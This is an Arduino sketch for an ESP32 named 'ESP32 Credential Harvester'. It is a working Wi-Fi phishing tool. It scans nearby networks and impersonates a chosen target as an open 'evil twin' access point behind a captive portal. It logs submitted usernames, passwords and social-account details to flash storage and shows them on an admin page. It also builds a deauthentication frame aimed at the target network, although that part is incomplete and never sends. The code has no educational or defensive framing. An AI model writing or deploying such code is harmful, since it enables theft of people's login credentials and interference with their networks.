#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

#define AP_SSID "ESP32 Credential Harvester" // AP name 
#define AP_PASSWORD "eViYurLo" // Password must be at least 8 characters long.
#define AP_IP IPAddress(192, 168, 4, 1)
#define AP_NETMASK IPAddress(255, 255, 255, 0)
#define DNS_PORT 53
#define LOGFILE "/logs.txt"

struct _Network {
  String ssid;
  uint8_t bssid[6]; // MAC address 
  int ch; // Channel 
};

_Network _networks[16];
_Network _selectedNetwork;
WebServer server(80);
DNSServer dnsServer;

bool deauth_active = false;
unsigned long deauth_now = 0;

void logCredentials(const String & user, const String & pass, const String & social) {
  Serial.println("Logging credentials to file...");

  File f = SPIFFS.open(LOGFILE, "a");
  if (!f) {
    Serial.println("Failed to open log file for writing");
    return;
  }

  f.print("USER: ");
  f.print(user);
  f.print(", PASSWORD: ");
  f.print(pass);
  f.print(", SOCIAL: ");
  f.println(social);
  f.close();

  Serial.println("Credentials logged successfully.");
}

void handleStaticFiles() {
  String path = server.uri();
  String mimeType = "application/octet-stream"; // Default MIME type for binary files

  // Check the file extension and assign the correct MIME type
  if (path.endsWith(".html")) mimeType = "text/html";
  else if (path.endsWith(".css")) mimeType = "text/css";
  else if (path.endsWith(".js")) mimeType = "application/javascript";
  else if (path.endsWith(".png")) mimeType = "image/png";
  else if (path.endsWith(".jpg") || path.endsWith(".jpeg")) mimeType = "image/jpeg";
  else if (path.endsWith(".gif")) mimeType = "image/gif";
  else if (path.endsWith(".svg")) mimeType = "image/svg+xml";
  else if (path.endsWith(".ico")) mimeType = "image/x-icon";

  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    server.streamFile(file, mimeType);
    file.close();
  } else {
    server.send(404, "text/html", "<html><body><h1>404 Not Found</h1></body></html>");
  }
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray(); 
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network; 
    }
  }
}

void handleRoot() {
  if (SPIFFS.exists("/index.html")) {
    File file = SPIFFS.open("/index.html", "r");
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(404, "text/html", "<html><body><h1>404 Not Found</h1></body></html>");
  }
}

void handleAdmin() {
  String logContents = "";

  File logFile = SPIFFS.open(LOGFILE, "r");
  if (logFile) {
    logContents = logFile.readString();
    logFile.close();
  } else {
    logContents = "Unable to open log file!";
  }

  String htmlPage = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>";
 
  htmlPage += "<style>";
  htmlPage += "body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }";
  htmlPage += "h1 { font-size: 32px; color: #333; text-align: center; padding: 10px; background-color: #0078D4; color: white; border-radius: 5px; }";
  htmlPage += "h2 { font-size: 24px; color: #333; margin-top: 20px; }";
  htmlPage += "table { width: 100%; border-collapse: collapse; margin-top: 20px; }";
  htmlPage += "th, td { padding: 12px 15px; border: 1px solid #ddd; text-align: center; }";
  htmlPage += "th { background-color: #f1f1f1; }";
  htmlPage += "tr:hover { background-color: #f9f9f9; }";
  htmlPage += "button { padding: 10px 20px; background-color: #0078D4; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }";
  htmlPage += "button:hover { background-color: #005a8b; }";
  htmlPage += "select { padding: 8px 12px; border-radius: 5px; border: 1px solid #ddd; font-size: 16px; }";
  htmlPage += "form { margin-top: 20px; text-align: center; }";
  htmlPage += "h3 { margin-top: 20px; }";
  htmlPage += "</style>";
  htmlPage += "</head><body>";
  htmlPage += "<h1>Admin Panel</h1>";
  htmlPage += "<h2>Available Networks</h2>";
  htmlPage += "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Freq</th></tr>";

  performScan();

  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid != "") { 
      htmlPage += "<tr>";
      htmlPage += "<td>" + _networks[i].ssid + "</td>";

      // Format BSSID as MAC address
      String bssid = "";
      for (int j = 0; j < 6; j++) {
        bssid += String(_networks[i].bssid[j], HEX);
        if (j < 5) bssid += ":";
      }
      htmlPage += "<td>" + bssid + "</td>";
      htmlPage += "<td>" + String(_networks[i].ch) + "</td>";
      htmlPage += "<td>" + String(WiFi.RSSI(i)) + "</td>";

      // Calculate frequency based on channel
      String freq = (WiFi.channel(i) <= 13) ? "2.4 GHz" : ((WiFi.channel(i) >= 36 && WiFi.channel(i) <= 165) ? "5 GHz" : "Unknown");
      htmlPage += "<td>" + freq + "</td>";

      htmlPage += "</tr>";
    }
  }

  htmlPage += "</table>";

  if (_selectedNetwork.ssid != "") {
    htmlPage += "<h3>Currently Attacking: " + _selectedNetwork.ssid + "</h3>";
  }

  if (deauth_active) {
    htmlPage += "<form method='POST' action='/attack'>";
    htmlPage += "<button type='submit'>Stop Attack</button>";
    htmlPage += "</form>";
  } else {
    String availableNetworksDropdown = "<select name='network' id='network'>";
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid != "") {
        availableNetworksDropdown += "<option value='" + _networks[i].ssid + "'>" + _networks[i].ssid + "</option>";
      }
    }
    availableNetworksDropdown += "</select>";

    htmlPage += "<form method='POST' action='/attack'>";
    htmlPage += "<h3>Select Preferred Network for Attack</h3>";
    htmlPage += availableNetworksDropdown;
    htmlPage += "<br><br>";
    htmlPage += "<button type='submit'>Start Attack</button>";
    htmlPage += "</form>";
  }

  htmlPage += "<h2>Captured Login Credentials</h2>";
  htmlPage += "<table><tr><th>Username</th><th>Password</th><th>Social</th></tr>";
  if (logContents != "Unable to open log file!") {
    // Split the log contents by lines 
    String line;
    int startIdx = 0;
    while ((startIdx = logContents.indexOf("USER:", startIdx)) != -1) {
      int endIdx = logContents.indexOf("\n", startIdx);
      if (endIdx == -1) endIdx = logContents.length();
      line = logContents.substring(startIdx, endIdx);

      String username = line.substring(line.indexOf("USER:") + 6, line.indexOf(", PASSWORD:"));
      String password = line.substring(line.indexOf("PASSWORD:") + 10, line.indexOf(", SOCIAL:"));
      String social = line.substring(line.indexOf("SOCIAL:") + 8);
      htmlPage += "<tr>";
      htmlPage += "<td>" + username + "</td>";
      htmlPage += "<td>" + password + "</td>";
      htmlPage += "<td>" + social + "</td>";
      htmlPage += "</tr>";
      
      startIdx = endIdx; // Move to the next log entry
    }
  } else {
    htmlPage += "<tr><td colspan='3'>No log entries available.</td></tr>";
  }

  htmlPage += "</table>";

  htmlPage += "<form method='get' action='/clearlogs'>";
  htmlPage += "<button type='submit'>Clear Logs</button>";
  htmlPage += "</form>";

  htmlPage += "</body></html>";

  server.send(200, "text/html", htmlPage);
}

void handleAttack() {
  if (deauth_active) {
    deauth_active = false; 
    _selectedNetwork.ssid = "";
    
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    dnsServer.start();

  } else {
    deauth_active = true; 
    String selectedNetworkSSID = server.arg("network");   
   
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);

    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == selectedNetworkSSID) {
        _selectedNetwork = _networks[i];
        break;
      }
    server.sendHeader("Location", "/admin"); 
    server.send(303); 
    }

    WiFi.softAP(_selectedNetwork.ssid.c_str()); 
    dnsServer.start();
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("ESP32 Captive Portal");

  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS initialization failed.");
    return;
  }
  Serial.println("SPIFFS initialized successfully.");

  File f = SPIFFS.open(LOGFILE, "r");
  if (!f) {
    Serial.println("Log file not found, creating a new one...");
    f = SPIFFS.open(LOGFILE, "w");
    if (f) {
      Serial.println("Log file created successfully.");
    } else {
      Serial.println("Failed to create log file.");
      return;
    }
  } else {
    f.close();

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);

    if (WiFi.softAP(AP_SSID, AP_PASSWORD)) {
      Serial.println("Access Point Created: " + String(AP_SSID));
    } else {
      Serial.println("Failed to create Access Point.");
      return;
    }

    if (dnsServer.start()) {
      Serial.println("Started DNS server");
    } else {
      Serial.println("Failed to start DNS server!");
    }

    server.on("/", HTTP_GET, handleRoot); 
    server.on("/generate_204", HTTP_GET, handleRoot); // Android captive portal
    server.on("/connecttest.txt", HTTP_GET, handleRoot); // Microsoft captive portal
    server.on("/hotspot-detect.html", HTTP_GET, handleRoot); // Apple captive portal
    server.on("/admin", HTTP_GET, handleAdmin);
    server.on("/attack", HTTP_POST, handleAttack);
    server.on("/attack", HTTP_GET, [](){
      server.sendHeader("Location", "/admin"); 
      server.send(303); 
    });

    server.onNotFound(handleStaticFiles); // Handle other static files

    server.on("/validate", HTTP_POST, []() {
      String username = server.arg("username");
      String password = server.arg("password");
      String social = server.arg("social");

      logCredentials(username, password, social);

      server.sendHeader("Location", "/connect.html");
      server.send(303);
    });

    server.on("/clearlogs", HTTP_GET, []() {
      File logFile = SPIFFS.open(LOGFILE, "w");
      if (logFile) {
        logFile.close();
        server.sendHeader("Location", "/admin"); 
        server.send(303);
      } else {
        server.send(500, "text/html", "<h1>Error clearing logs</h1>");
      }
    });

    server.begin();
    Serial.println("Web server started.");
  }
}

void loop() {
  dnsServer.processNextRequest(); // Handle the DNS redirection
  server.handleClient(); // Handle HTTP requests

  if (deauth_active && millis() - deauth_now >= 1000) {
    int channel = _selectedNetwork.ch;

    // Check if the WiFi channel is within the range of 2.4 GHz (channels 1–13)
    if (channel >= 1 && channel <= 13) {
      WiFi.setChannel(channel);
    }

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    // Set the target BSSID in the deauth packet
    memcpy( & deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy( & deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1; // Set deauthentication frame type
    deauthPacket[0] = 0xC0;
    deauthPacket[0] = 0xA0;
    Serial.println("Sending deauth packet...");
    deauth_now = millis();
  }
}